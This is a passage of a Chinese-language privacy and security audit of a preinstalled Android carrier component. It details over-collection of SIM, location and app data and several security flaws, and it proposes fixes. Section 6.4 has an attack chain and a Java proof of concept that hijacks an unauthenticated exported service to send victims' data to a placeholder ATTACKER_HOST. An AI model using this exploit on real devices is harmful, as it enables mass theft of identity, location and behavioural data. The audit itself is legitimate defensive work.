| `ICCID` | 无直接相关 | 卡槽位 + 运营商即可 | ❌ 超范围 |
| `IMSI` | 无直接相关 | 同上 | ❌ 超范围 |
| `MSISDN` | 无直接相关 | 运营商侧本已持有开户号 | ❌ 超范围 |
| `CellID` / `LAC` | **无任何相关** | 网络优化不依赖终端上报小区号 | ❌ 超范围 |
| `AppInfo[]` | **无任何相关** | 应完全删除 | ❌ 严重超范围 |

**量化：12 类中，必要 4、可最小化 3、超出必要 5（占 42%）。**

### 5.3.2 关键技术论证：技术上明明可以少采

Android 官方的 Device Owner 机制，通过 `Build.MODEL` + `Build.VERSION.SDK_INT` + `TelephonyManager.getNetworkType()` 即可完成机型适配与网络能力识别，**不需要 IMEI、不需要应用列表、不需要基站信息**。

GSMA 的终端管理规范同样以"能力协商"为核心，而非"身份采集"。

因此"业务需要"解释不了为何采集应用画像与基站位置 —— 这些数据与目的之间**不存在因果关系，只存在"顺便采集"的关系** `[B]`。

### 5.3.3 三项最具侵入性的采集

**（1）基站定位可反推轨迹**

`CellID + LAC` 是蜂窝小区标识，单独即可定位到数百米范围；配合 `History[]` 保留的历史记录，可还原用户一段时间的移动路径。这实质上是**在未提示定位的情况下获得了位置追踪能力**。

**（2）应用画像构成行为侧写**

代码实现（`control.e`）：

```java
List<ApplicationInfo> installed = pm.getInstalledApplications(0);          // 全部已安装应用
List<UsageStats> list = usageStatsManager.queryAndAggregateUsageStats(t0, t1);  // 每应用前台时长
NetworkStats ns = networkStatsManager.querySummary(TYPE_MOBILE, imsi, t0, t1); // 分卡流量
```

单条记录（`b.c.a.b.b#a()`）：

```java
jSONObject.put("appLabel", ...);                                  // 应用显示名
jSONObject.put("pkgName", ...);                                   // 包名
jSONObject.put("runTime", this.c + "min");                        // 前台使用时长
jSONObject.put("tx1", ...); jSONObject.put("rx1", ...);           // 卡1 流量
jSONObject.put("tx2", ...); jSONObject.put("rx2", ...);           // 卡2 流量
jSONObject.put("totalData1", ...); jSONObject.put("totalData2", ...);
jSONObject.put("totalDataWiFi", ...);
```

推断能力远超"应用列表"字面含义：

| 推断维度 | 依据 | 敏感性 |
|---|---|---|
| 健康状况 | 医院挂号、慢病管理、健身、经期记录类 App | 医疗健康（第 28 条） |
| 宗教信仰 | 宗教类 App | 宗教信仰（第 28 条） |
| 政治倾向 | 新闻客户端选择与时长分布 | 特定身份 |
| 财务状况 | 银行、借贷、理财组合 | 金融账户（第 28 条） |
| 社交关系 | 社交/婚恋类 App 及活跃时段 | 私密关系 |
| 是否未成年人 | 教育、家长管控、青少年模式类 App | 未成年人（第 31 条） |

**（3）双卡身份三要素齐全**

`IMSI + ICCID + MSISDN` 同时具备，是 SIM 卡克隆类黑产的关键前置信息。运营商侧持有尚可解释为开户数据核对，但以明文 HTTP 在公网传输则完全不可接受（见 6.3）。

---

## 5.4 P-03｜开机静默回传，周期唤醒【高】

### 5.4.1 时序

```
t=0        设备开机
t≈0        BOOT_COMPLETED（priority=2147483647，抢在绝大多数应用之前）
t≈0        注册三条定时链：4 分钟后自触发、24h、7d
t=4min     唤醒 → 采集全部字段 → 加密 → HTTP POST
t=24h      周期上报（基础信息）
t=7d       周期上报（含全量应用清单）
另触发点   SIM_STATE_CHANGED（+6min）、信号强度变化
```

### 5.4.2 三个刻意的设计

**（1）最高优先级抢占开机**

```xml
<intent-filter android:priority="2147483647">    <!-- Integer.MAX_VALUE -->
    <action android:name="android.intent.action.BOOT_COMPLETED"/>
    <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
</intent-filter>
```

确保在系统启动阶段尽早执行，用户难以在"刚开机"的混乱中察觉。

**（2）延迟 4 分钟规避开机高峰**

```java
j.a("OnBootReceiver", " boot delayed for 4 minutes-->");
b.c.a.b.a.b(f611a, 240000L);
```

开机瞬间的网络请求容易被察觉；延迟 4 分钟后系统进入常态，流量与耗电归因困难。

**（3）绕过 Doze 强制唤醒**

```java
alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + j, broadcast);
```

`setExactAndAllowWhileIdle` 是**唯一能在 Doze 深度待机下强制唤醒设备**的闹钟类型，系统对其有严格配额（每应用每 9 分钟一次），正是为"必须准时"的场景保留。本应用将其用于周期性的数据回传，用途与设计意图不符，且直接造成待机耗电增加。

### 5.4.3 用户可感知度评估

| 环节 | 能否感知 | 说明 |
|---|---|---|
| 采集 | ❌ | 全程无界面、无通知、无 Toast |
| 上传 | ❌ | 无进度提示，失败静默重试 |
| 定时唤醒 | ❌ | 仅体现为待机耗电轻微上升 |
| 首次运行 | ⚠️ 部分 | 仅在用户手动打开 `TestActivity` 时申请 3 项运行时权限，且不解释用途 |

### 5.4.4 六项技术选择同向

| 技术选择 | 客观效果 | 常规做法 |
|---|---|---|
| 开机广播 `priority=2147483647` | 抢在绝大多数应用之前 | 通常不设或设 1000 |
| 采集延迟 4 分钟 | 避开开机网络高峰 | 无此必要 |
| `setExactAndAllowWhileIdle()` | 穿透 Doze | 通常用 `WorkManager`，允许合并延后 |
| 全程无通知/无图标 | 用户无视觉提示 | 后台同步通常保留通知 |
| 失败静默入队 | 无错误提示 | 通常记录并提示 |
| 无任何设置界面 | 无处查看/关闭 | 通常提供设置页 |

**客观陈述**：六项单独看都有"技术合理性"解释（性能、省电），但**六项同时指向同一方向** —— 降低被察觉概率。这一点不需要推断动机即可成立。

---

## 5.5 P-04｜接收方、用途、期限、共享均未披露【高】

| 应披露项 | 实际情况 |
|---|---|
| 接收方身份 | **已确证为中国联通**（`pub.cer` 主体 `O=UNICOM`），但应用内对用户无任何说明 |
| 处理目的 | 未说明。"设备管理"是推断，非声明 |
| 保存期限 | 未说明。本地 100 + 500 条，服务端未知 |
| 是否共享第三方 | 未说明。机型表覆盖 50+ 厂商，暗示数据可能在运营商与厂商间流转 `[C]` |
| 是否出境 | 未说明 `[C]` |
| 处理方式 | 未说明（是否关联、是否用于营销画像）`[C]` |
| 权利行使渠道 | 无（无客服入口、无隐私联络方式） |

---

## 5.6 P-05｜用户无实际控制权【高】

| 控制手段 | 可行性 | 说明 |
|---|---|---|
| 应用内关闭采集 | ❌ | `f.g` 默认 true，仅部分机型由系统设置覆盖 |
| 撤回同意 | ❌ | 无入口 |
| 删除已上传数据 | ❌ | 无渠道 |
| 清除本地数据 | ⚠️ 间接 | 仅导出服务的 `e()` 可删配置文件，普通用户无法调用 |
| 卸载应用 | ❌ 通常不可 | 平台签名 + 预装形态 |
| 禁用应用 | ⚠️ 视 ROM | 部分 ROM 允许"停用"，但可能影响 VoLTE/网络，形成"停用即受损"的两难 |
| 限制联网 | ⚠️ 视 ROM | 需系统级防火墙或第三方工具 |

**结构性判断**：用户在该关系中不具备任何实质性的选择权或退出权。个人信息保护制度的核心是"用户对自身信息的控制"，当控制权为零时，**即使采集内容合理，该处理行为也失去正当性基础** `[B]`。

### 5.6.1 十项法定权利实现度

| 权利 | 条款 | 实现 | 差距 |
|---|---|---|---|
| 知情权 | 第 44 条 | ❌ | 告知未送达，内容残缺 |
| 决定权 | 第 44 条 | ❌ | 无同意/拒绝入口 |
| 查阅、复制权 | 第 45 条 | ❌ | 无查询渠道 |
| 可携带权 | 第 45 条 | ❌ | 无导出机制 |
| 更正、补充权 | 第 46 条 | ❌ | 无渠道 |
| 删除权 | 第 47 条 | ❌ | 仅上传成功时自动清表，用户不可发起 |
| 撤回同意权 | 第 15 条 | ❌ | 无入口（部分机型依赖系统设置） |
| 解释说明权 | 第 48 条 | ❌ | 无渠道 |
| 自动化决策拒绝权 | 第 24 条 | ❌ | 画像采集未告知 |
| 死者近亲属权利 | 第 49 条 | ❌ | 无渠道 |

**实现度 0/10。** 第 50 条要求的"便捷的权利申请受理和处理机制"完全不存在。

---

## 5.7 P-06｜敏感数据明文留存【高】

| 位置 | 内容 | 容量 | 保护 |
|---|---|---|---|
| `databases/systemhelper`（表 `history`） | 完整设备信息 JSON | 100 条 | **无** |
| `databases/signalhelper`（表 `signal`） | 信号 + **GPS 经纬度** | **500 条** | **无** |
| `shared_prefs/...xml` | 上报地址、日志开关、ICCID | — | `MODE_WORLD_READABLE` |
| logcat | 完整明文 JSON | — | **无** |

```java
// b.c.a.b.d —— history 表
sQLiteDatabase.execSQL("create table history(id integer primary key autoincrement, jsonString text)");
contentValues.put("jsonString", str);          // 明文，上限 100

// b.c.a.b.m —— signal 表
sQLiteDatabase.execSQL("create table signal(id integer primary key autoincrement, jsonString text)");
if (cursorQuery.getCount() >= 500) { ... }     // 明文，上限 500

// b.c.a.b.l —— SharedPreferences
context.getSharedPreferences("com_mobiletools_systemhelper_preference", 4);   // MODE_WORLD_READABLE
```

**三个与用户直接相关的场景**：

1. **二手转卖 / 送修** —— 设备在维修、回收、转卖环节若被 root 或取得调试权限，两个库中最多 600 条记录可完整还原前机主的双卡身份、常驻基站、GPS 轨迹与应用使用习惯；
2. **同 UID 应用互读** —— `sharedUserId` 机制下，任何同签名应用可直接读取上述文件（见 6.2.4）；
3. **日志被第三方读取** —— 具备 `READ_LOGS`（旧版本）或 adb 调试权限的一方可批量导出明文 PII。

---

## 5.8 P-07｜强制修改系统 VoLTE 设置【中】

`b.c.a.a.c#a(Context, int)` 在"读取"VoLTE 状态时执行写操作：

```java
ImsMmTelManager imsMmTelManager = imsManager.getImsMmTelManager(iC);
if (!imsMmTelManager.isAdvancedCallingSettingEnabled()) {
    j.a("DeviceInfoReaderBase", "before open:false");
    // 反射调用隐藏接口，强制置为 true
    b.c.a.b.o.a(
        b.c.a.b.o.a((Class<?>) ImsMmTelManager.class,
                    "setAdvancedCallingSettingEnabled",  new Class[]{Boolean.TYPE}),
        imsMmTelManager, true);
}
```

**对用户的实际影响**：

- VoLTE 开启后通话建立更快，但部分资费套餐下视频通话可能产生额外费用；
- 国际漫游场景下 VoLTE 资费策略与本地不同，强制开启可能导致账单异常；
- 部分网络环境下 VoLTE 反而导致通话质量下降或掉话；
- 用户若因上述原因**主动关闭** VoLTE，本应用会再次将其打开，且无任何提示。

属于"以采集为名、行修改之实"，超出了数据采集的合理边界。

---

## 5.9 P-08｜脆弱群体与特殊场景【中】

| 群体/场景 | 风险特征 |
|---|---|
| **未成年人** | 家长购置的定制机同样预装；画像可暴露其社交/游戏/教育类 App 使用；监护人无法代为实现拒绝权。第 31 条要求监护人单独同意与专门规则，本应用三者皆无 |
| **老年人** | 对预装组件无认知能力，最不可能察觉异常流量与耗电 |
| **政企/涉密终端** | 设备型号、应用清单（可推断内部系统）、常驻位置外流至运营商侧 |
| **双卡跨境用户** | 卡 2 为境外卡时，IMSI/ICCID 与基站变化可反映出入境行为（第 38 条） |
| **二手设备持有者** | 继承前机主残留数据（见 5.7） |

---

## 5.10 合规判定汇总

| 法规 / 标准 | 条款 | 判定 | 依据 |
|---|---|---|---|
| 个人信息保护法 | 第 6 条 最小必要 | ✗ 违反 | 42% 字段与目的无因果关系 |
| 个人信息保护法 | 第 13 条 合法性基础 | ✗ 违反 | 六种基础皆不成立 |
| 个人信息保护法 | 第 17 条 告知义务 | ✗ 违反 | 覆盖率 23%，且未送达 |
| 个人信息保护法 | 第 24 条 自动化决策 | ✗ 违反 | 画像未告知、无拒绝途径 |
| 个人信息保护法 | 第 28/29 条 敏感信息 | ✗ 违反 | 13 个敏感字段，无单独同意 |
| 个人信息保护法 | 第 51 条 安全措施 | ✗ 违反 | 明文传输、明文存储 |
| 个人信息保护法 | 第 55 条 影响评估 | 未见 | 敏感信息处理应事前 PIA |
| GB/T 35273-2020 | 5.2 / 6.3 / 7.1 | ✗ 违反 | 收集规则未公开、传输未加密、无撤回 |
| 《App 违法违规收集使用个人信息行为认定方法》 | 第一/三/四/六条 | ✗ 四项认定 | 未公开规则、收集无关信息、未经同意、无删除更正渠道 |
| 《电信和互联网用户个人信息保护规定》 | 第 8、9 条 | ✗ 违反 | 未公布收集规则、未经同意收集 |
| 《移动智能终端应用软件预置和分发管理暂行规定》 | 第 6、7 条 | ✗ 违反 | 未经同意收集 + 不可卸载 |
| GDPR（若涉欧盟用户） | Art.5 / 6 / 13 / 32 | ✗ 违反 | 无合法性基础、无告知、无安全措施 |

### 5.10.1 六种合法性基础逐项检验

| 基础（第 13 条） | 是否成立 | 理由 |
|---|---|---|
| ① 取得个人同意 | ❌ | 无有效同意，见 5.2 |
| ② 订立/履行合同所必需 | ❌ | 电信服务合同不以"上传全量应用列表"为必要；设备注册可用哈希完成 |
| ③ 履行法定职责或义务 | ❌ | 无任何法律要求采集已安装应用清单；实名制只要求手机号 |
| ④ 突发公共卫生事件等紧急情况 | ❌ | 不适用 |
| ⑤ 为公共利益实施新闻报道 | ❌ | 不适用 |
| ⑥ 处理已公开的个人信息 | ❌ | 上述数据均非公开 |

**六种基础无一成立。** 这是最根本的判断 —— 该处理行为自始缺乏合法性依据。

> **客观说明**：预装系统组件在部分司法辖区可援引"合法利益"（GDPR Art.6(1)(f)）抗辩。但中国《个人信息保护法》**未设"合法利益"基础**，第 13 条为封闭列举，因此该抗辩在中国法下不成立 `[B]`。

---

## 5.11 数据聚合：单字段普通，组合后构成画像

### 5.11.1 身份锚定

```
IMEI（设备唯一） + IMSI（SIM 唯一） + MSISDN（实名手机号） + ICCID（卡唯一）
```

四者齐全 = 一个物理设备 + 一张实名 SIM 卡 + 一个手机号 + 一个设备号，形成指向特定自然人的完整锚点。运营商侧本已持有开户实名信息，一旦关联 `[C]`，39 个字段立即变为**实名化行为记录**。

### 5.11.2 位置轨迹

`CellID + LAC` 单次精度数百米至数公里；`History[]` 保留历史，配合 24h 周期可判断：

- 常住地（夜间基站聚集）
- 工作地（日间聚集）
- 异常移动（跨城基站变化）
- 主副卡与跨境行为

若 `f.e` 被打开，还有 1 秒/10 米的 GPS 轨迹。

### 5.11.3 聚合导致性质变化

| 数据组合 | 性质 |
|---|---|
| 单独 `Model` | 设备统计，非个人信息 |
| `+ IMEI` | 可识别设备，准个人信息 |
| `+ IMSI + MSISDN` | **可识别自然人，个人信息** |
| `+ CellID/LAC + History` | **可追踪自然人，敏感个人信息** |
| `+ AppInfo[]` | **可刻画自然人，构成个人画像** |
| `+ SignalInfo.location` | **可精确定位自然人，敏感个人信息** |

据此，该数据集已跨越第 24 条"自动化分析形成个人画像"的门槛，而应用**未作任何告知，也未提供拒绝途径**。

**关键**：即便采集者"没有打算"做画像，**数据一旦集中，推断能力就客观存在**，不依赖采集者意图。这正是第 51 条要求去标识化的根本原因。

---

## 5.12 反面证据与不确定性

以下内容**削弱但不推翻**上述结论。这是本报告客观性的核心部分。

### 5.12.1 对厂商有利的事实

| # | 事实 | 影响 |
|---|---|---|
| 1 | 应用确实留有告知文案（5 段中文，语义完整） | 说明并非完全无视告知义务；但文案未展示、内容残缺 |
| 2 | `allowBackup="false"` | 阻断 `adb backup` 导出路径，属正确配置 |
| 3 | 上传经过加密（RSA + AES） | 虽设计有缺陷，但说明有保护意识 |
| 4 | 采集前检查运行时权限 | 遵循 Android 权限模型，未绕过授权 |
| 5 | 仅在 WiFi 或联通网络下上报 | 客观上限制了外发范围 |
| 6 | `RegisterJobService` 正确声明 `BIND_JOB_SERVICE` | 组件配置有正确案例 |
| 7 | 存在 "User Permission Closed!" 日志分支 | 暗示曾设计用户关闭路径 |
| 8 | **部分机型有真实同意门控** | vivo/百度适配器读系统设置，关闭后确实跳过采集（但覆盖不了多数机型） |

### 5.12.2 本报告无法证实的事项

| # | 事项 | 状态 |
|---|---|---|
| 1 | 服务端是否与实名开户信息关联 | `[C]` |
| 2 | 是否共享给终端厂商或第三方 | `[C]`（机型表覆盖 50+ 厂商，但**不能据此推断存在共享**） |
| 3 | 是否用于营销、风控等二次用途 | `[C]` |
| 4 | 是否出境 | `[C]` |
| 5 | 是否已发生实际泄露 | `[D]` |
| 6 | 是否曾出售数据 | `[D]` **无证据，本报告不作此指控** |
| 7 | 是否做过隐私影响评估或监管备案 | `[C]` |
| 8 | 服务端能否远程打开 `f.e`（GPS 开关） | `[C]` |

### 5.12.3 边界说明

- 本报告**不主张**该应用存在"恶意"或"窃取"意图。从代码看，它是功能明确的设备管理组件，采集是其设计目的的一部分；
- 本报告**不主张**其违反电信实名制规定 —— 实名制要求运营商采集身份信息，而非采集用户应用列表；
- 本报告**不主张**所有预装组件都有此问题，结论仅适用于本样本。

### 5.12.4 一个诚实的补充

"设备管理组件采集 IMEI"在行业内并不罕见，部分运营商定制机确实以此完成终端库建设。因此本报告的核心指控**不是"采集了 IMEI"**，而是：

> **在采集了远超必要的敏感数据的同时，既未有效告知，也未取得同意，更未提供任何退出机制。**

这三者的组合才是问题所在。

---

## 5.13 侵权要件分析

依《个人信息保护法》第 69 条（过错推定责任）：

| 要件 | 成立 | 依据 |
|---|---|---|
| ① 存在处理行为 | ✅ | 采集 + 存储 + 传输，见 4.1/4.5 |
| ② 无合法性基础 | ✅ | 六种基础均不成立；同意四要件均不成立 |
| ③ 造成损害或损害危险 | ✅ | 敏感信息被超范围采集并明文传输，构成《民法典》第 1034–1039 条项下的人格权益侵害 |
| ④ 因果关系 | ✅ | 损害危险直接源于采集与传输行为 |
| ⑤ 过错 | **推定成立** | 第 69 条采过错推定，处理者需自证无过错；本报告未发现其可自证的证据 |

**结论**：四个积极要件成立，过错依推定成立，**构成对用户个人信息权益的侵害** `[B]`。

> 说明：本报告不对"是否造成实际经济损失"作判断 —— 这需要具体损害事实证明，超出静态分析范围。但第 69 条明确，侵害个人信息权益造成损害即应担责，实践中"权益受侵害"本身即可认定为损害。

---

## 5.14 严重性评级

| 维度 | 得分 | 理由 |
|---|---|---|
| 数据敏感度 | **5** | 13 个法定敏感字段 + 可推断画像 |
| 处理规模 | **5** | 预装覆盖全部该机型用户，24h/7d 周期，全生命周期 |
| 可控性缺失 | **5** | 完全不可控 |
| 透明度缺失 | **5** | 覆盖率 23%，同意四要件全不成立 |
| **合计** | **20/20** | **极高（Critical）** |

### 5.14.1 与常见隐私问题的对比定位

| 场景 | 敏感度 | 规模 | 可控性 | 透明度 | 综合 |
|---|---|---|---|---|---|
| 崩溃日志上传（含型号） | 2 | 4 | 4 | 4 | 中 |
| 个性化推荐（含浏览记录） | 3 | 5 | 3 | 4 | 中高 |
| 广告 SDK 采集 OAID | 3 | 5 | 2 | 3 | 高 |
| **本应用** | **5** | **5** | **1** | **1** | **极高** |

---

# 第 6 章 安全层面：软件自身的安全缺陷

## 6.1 本层面的核心判断

这个层面需要攻击者介入，但**门槛极低**：最严重的一条（S-01）不需要任何权限、不需要 root、不需要用户交互，只需在设备上装一个普通 App。

## 6.2 攻击面矩阵

| 入口 | 类型 | 可达性 | 所需条件 |
|---|---|---|---|
| `RegisterHelperService` | Binder | **任意应用** | **无** |
| `TestActivity` | Activity | 任意应用 | 无 |
| `OnBootReceiver` / `SIMStateReceiver` / `ConnectStateReceiver` | Broadcast | 受限（protected broadcast） | 部分需系统权限 |
| `/registerv3` 传输链路 | 网络 | 同链路中间人 | 网络位置 |
| 本地数据库 / SP | 文件 | 同 UID / root | 签名或 root |
| logcat | 系统日志 | 本地 | 调试权限 / READ_LOGS |

## 6.3 组件导出矩阵

| 组件 | 类型 | exported | permission | 风险 |
|---|---|---|---|---|
| `Activity.TestActivity` | Activity | **true** | 无 | 中 |
| `control.OnBootReceiver` | Receiver | **true** | 无 | 中 |
| `control.SIMStateReceiver` | Receiver | **true** | 无 | 中 |
| `control.ConnectStateReceiver` | Receiver | **true** | 无 | 低 |
| `control.ScheduleRegisterReceiver` | Receiver | false | 无 | 低 |
| `control.AppInfoRegisterReceiver` | Receiver | false | 无 | 低 |
| `service.RegisterHelperService` | **Service** | **true** | **无** | **严重** |
| `service.RegisterIntentService` | Service | false | 无 | 低 |
| `service.RegisterJobService` | Service | false | `BIND_JOB_SERVICE` | 低（配置正确） |

> 已声明的 `com.mobiletools.systemhelper.permission`（signature 级）**未被任何组件引用**，属完全失效的防护。

---

## 6.4 S-01｜导出服务无鉴权，上报通道可被劫持【严重】

**CVSS 3.1 近似 9.1**：`AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

### 6.4.1 证据

```xml
<service android:name="com.mobiletools.systemhelper.service.RegisterHelperService"
         android:exported="true">
    <intent-filter>
        <action android:name="com.mobiletools.systemhelper.service.IRegisterHelperService"/>
    </intent-filter>
</service>
```

**未声明 `android:permission`。**

应用自己定义的 signature 级权限，在全包中**从未被任何组件引用**：

```xml
<permission android:name="com.mobiletools.systemhelper.permission"
            android:protectionLevel="signature"/>
```

### 6.4.2 Binder 暴露的五个方法

```java
class a extends com.mobiletools.systemhelper.service.a.AbstractBinderC0033a {

    @Override public void a(String str) {          // ① 改写上报地址
        l.a(RegisterHelperService.this.f626b, str);
    }

    @Override public void a(boolean z) {           // ② 远程打开明文日志
        f.f599a = z;
        l.b(RegisterHelperService.this.f626b, "preference_enable_log", Boolean.valueOf(z));
    }

    @Override public boolean a() {                 // ③ 读取日志开关状态
        return l.a(RegisterHelperService.this.f626b, "preference_enable_log", false);
    }

    @Override public void e() {                    // ④ 删除整个 SP 文件
        l.a();
    }

    @Override public void i(int i) {               // ⑤ 一次性改写三个采集间隔
        l.b(RegisterHelperService.this.f626b, i);              // → scheduleInterval（毫秒）
        l.a(RegisterHelperService.this.f626b, (i * 8) / 5);    // → appInfoInterval
        l.c(RegisterHelperService.this.f626b, (i * 9) / 5);    // → signalInfoInterval
    }
}
```

`onBind()` 中**没有任何调用方身份校验**：

```java
@Override
public IBinder onBind(Intent intent) {
    j.b("RegisterHelperService", "registerhelper Service onBind sucessed!");
    return new a();                     // 直接返回，未检查 Binder.getCallingUid()
}
```

### 6.4.3 为什么"改一个字符串"就能劫持全链路

上报 URL 的前缀来源正是 `a(String)` 写入的那个键：

```java
// b.c.a.b.l
public static String c(Context context) {
    return a(context, "serverAddress", f.w);      // 默认 http://dm.wo.com.cn:18080/registerv3
}

// control.g#a(c) —— 上报线程
String str = l.c(this.f625b)                      // ← 可被外部改写
        + "?ver=3.0&model=" + URLEncoder.encode(cVar.f622b, "utf-8")
        + "&manuf=" + URLEncoder.encode(cVar.f621a, "utf-8")
        + "&sign=" + strEncode;
byte[] bArrA2 = b.c.a.b.c.a(strA, bArrA);
new b.c.a.b.g().a(str, bArrA2, bArrA);            // POST 到该地址
```

`serverAddress` 一旦被改写，**整个上报流程无需任何其他改动**，下一次定时任务就会把数据发往新地址。

### 6.4.4 完整攻击链

```
恶意应用（零权限）
  → bindService(com.mobiletools.systemhelper/.service.RegisterHelperService)
  → transact(TRANSACTION_a, "http://ATTACKER_HOST:8080/collect")
  → SharedPreferences.serverAddress = 攻击者地址
  → [等待] 开机 +4min / 24h 定时 / 换卡
  → 双卡 IMEI、IMSI、ICCID、手机号、基站、全量应用清单
     以 application/encrypted-json 形式 POST 至攻击者服务器
```

**攻击者成本**：一个约 30 行的 Android 工程，无需任何权限申请，无需诱导用户点击，安装后静默等待。若该应用装机量为百万级，等同于掌握百万用户的实名身份、位置与行为画像。

### 6.4.5 PoC（概念验证，未执行）

```java
Intent it = new Intent("com.mobiletools.systemhelper.service.IRegisterHelperService");
it.setPackage("com.mobiletools.systemhelper");
bindService(it, conn, Context.BIND_AUTO_CREATE);

// onServiceConnected(ComponentName n, IBinder b)
Parcel d = Parcel.obtain(), r = Parcel.obtain();
d.writeInterfaceToken("com.mobiletools.systemhelper.service.IRegisterHelperService");
d.writeString("http://ATTACKER_HOST:8080/collect");
b.transact(1 /* 事务号需按 AIDL 声明顺序校准 */, d, r, 0);
d.recycle(); r.recycle();
```

### 6.4.6 修复

1. `android:exported="false"`（该服务仅本应用使用，无导出必要）；
2. 若确需导出，加 `android:permission="com.mobiletools.systemhelper.permission"` 并在 Binder 中校验 `Binder.getCallingUid()` 的签名一致性；
3. `serverAddress` 写入前做强校验：仅允许 `https://*.wo.com.cn`，并做 HMAC 防篡改；
4. `a(String)` / `a(boolean)` 这类高危能力不应通过 Binder 暴露给外部。

---

## 6.5 S-02｜全链路明文 HTTP【严重】

**CVSS 3.1 近似 7.0**：`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N`

### 6.5.1 证据

```xml
<application ... android:usesCleartextTraffic="true">
```

```java
// b.c.a.b.f
public static String w = "http://dm.wo.com.cn:18080/registerv3";
public static String x = "http://dm.wo.com.cn:18080/public/ip";

// b.c.a.b.g
HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str).openConnection();
this.f601a.setRequestMethod("POST");
this.f601a.setRequestProperty("Content-Type", "application/encrypted-json");
```

无 TLS、无证书校验、无证书固定（pinning）、无 `network_security_config` 约束。

### 6.5.2 影响

- 同一 Wi-Fi / 运营商链路上的中间人可完整获取 URL 参数与 body；
- body 虽为密文，但密钥可由明文 MD5 派生（见 S-03），**等同明文**；
- DNS 劫持、透明代理、恶意热点均可将流量导向第三方；
- 不符合《个人信息保护法》第 51 条"采取加密等安全技术措施"的强制要求。

### 6.5.3 修复

强制 HTTPS（TLS 1.2+）；移除 `usesCleartextTraffic`；添加 `network_security_config.xml` 禁止明文回退；对 `*.wo.com.cn` 做证书固定。

---

## 6.6 S-03｜密码学误用，加密形同虚设【严重】

**CVSS 3.1 近似 6.3**：`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`

### 6.6.1 证据

```java
// b.c.a.b.c
public static byte[] a(String s) {                          // ① MD5(明文)
    return MessageDigest.getInstance("MD5").digest(s.getBytes("UTF-8"));
}

public static byte[] a(String s, byte[] key) {              // ② AES(明文, key=MD5)
    SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, "AES");
    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
    cipher.init(1, secretKeySpec);
    return cipher.doFinal(str.getBytes("utf-8"));
}

// b.c.a.b.k
Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); // ③ 仅加密 MD5
```

### 6.6.2 六项缺陷

| # | 缺陷 | 后果 |
|---|---|---|
| 1 | **AES 密钥 = MD5(明文 JSON)** | 密钥由明文确定性派生，无 KDF、无盐、无迭代。JSON 结构高度可预测（字段名固定、取值域小），可离线穷举还原 |
| 2 | **密钥与签名为同一值** | `sign = RSA(MD5)`，`key = MD5`。服务端解开 `sign` 即得密钥；私钥一旦泄露即全网可解 |
| 3 | **ECB 模式** | 无 IV；相同明文块产生相同密文块，可做块级拼接与重放分析 |
| 4 | **RSA 用 PKCS#1 v1.5** | 非 OAEP，存在 Bleichenbacher 类填充预言风险 |
| 5 | **MD5 用于安全用途** | 已碰撞、已弃用 |
| 6 | **会话密钥机制未实现** | 见下 |

### 6.6.3 第 6 项最能说明问题

上报方法签名是：

```java
public boolean a(String str, byte[] body, byte[] rsaWrappedSessionKey)
```

三个参数，语义上第三个应是"RSA 封装后的随机会话密钥"。但方法体内：

```java
OutputStream out = this.f601a.getOutputStream();
out.write(bArr);        // 只写了 body
// bArr2（第三个参数）从未被使用
```

**"随机密钥 + 密钥封装"的设计被简化成了"MD5 派生"，第三参数成了死参数。** 这不是实现粗糙，而是安全设计在开发中被实质性放弃。

### 6.6.4 已实测验证

用 `MD5(明文)` 直接解密请求体，结果与原文件逐字节一致（详见附录 D）：

```bash
$ openssl enc -d -aes-128-ecb -K $(openssl dgst -md5 plain.json | awk '{print $NF}') \
        -nosalt -in body.bin -out decrypted.json
$ diff plain.json decrypted.json
（无输出 = 完全一致）
```

这并不证明"能破解别人的流量"，但证明了一件关键的事：**密钥不需要任何秘密即可由明文导出**。加密层提供的是"防结构窥探"，不是机密性。

### 6.6.5 上报公钥强度不足

```
主体    : C=CN, ST=BJ, L=BJ, O=UNICOM, OU=UNICOM, CN=UNICOM
有效期  : 2019-05-24 → 2119-04-30（100 年）
公钥    : 1024 bit RSA
```

NIST SP 800-57 自 2013 年起已不推荐 1024 位用于新系统；100 年不轮换意味着私钥一旦泄露，影响期是整个世纪。这也解释了签名密文为何是 128 字节（1024 位）而非 256 字节。

### 6.6.6 关于 ECB 的客观说明

本样本的 71 个密文块**全部唯一**，未观察到块重复。原因是示例 JSON 各字段值不同。ECB 的理论缺陷（无 IV、确定性、块可拼接）依然存在，但**不应夸大为"肉眼可见的重复块"**。

### 6.6.7 修复

TLS 承载；改为 `AES-256-GCM` + `SecureRandom` 随机会话密钥 + `RSA-OAEP` 封装；移除 MD5 与 ECB；更换 2048 位以上密钥并建立轮换机制。

---

## 6.7 S-04｜平台级 CA 证书 + sharedUserId【严重】

### 6.7.1 证据

```
证书主体  : CN=bbkmobile.com.cn, OU=IQOO, O=BBK, C=CN
BasicConstraints: CA:true (PathLen 无限制)
有效期    : 2012-09-25 → 2040-02-11（28 年）
算法      : SHA1withRSA / 2048 bit

Manifest  : android:sharedUserId="com.mobiletools.systemhelper.uid"
```

### 6.7.2 三重风险

| 风险 | 说明 |
|---|---|
| **签名密钥是 CA 密钥** | 应用签名与 CA 私钥复用是密钥管理禁忌，影响面远超单个应用 |
| **平台密钥广泛流通** | 主体信息（BBK / IQOO / Dongguan View / bbktel.com）与公开流传的 vivo/BBK 平台签名密钥特征一致，此类密钥在第三方 ROM、刷机包、开源仓库中反复打包 |
| **sharedUserId 放大后果** | 同签名应用共享 UID，可互访 `/data/data/com.mobiletools.systemhelper/`，直接读取明文数据库 |

### 6.7.3 组合后果

若密钥已流出，攻击者可签发"同签名"APK、声明相同 `sharedUserId`，从而：

1. 读取本应用私有目录中的明文 PII（600 条记录）；
2. 继承已授的运行时权限（含 `READ_PRIVILEGED_PHONE_STATE`）；
3. 以同 UID 身份接管 Binder 通道。

> 补充：APK 存在 v2/v3 签名块（`APK Sig Block 42` 命中），因此**不具备**典型 Janus（CVE-2017-13156）可利用条件。

### 6.7.4 修复

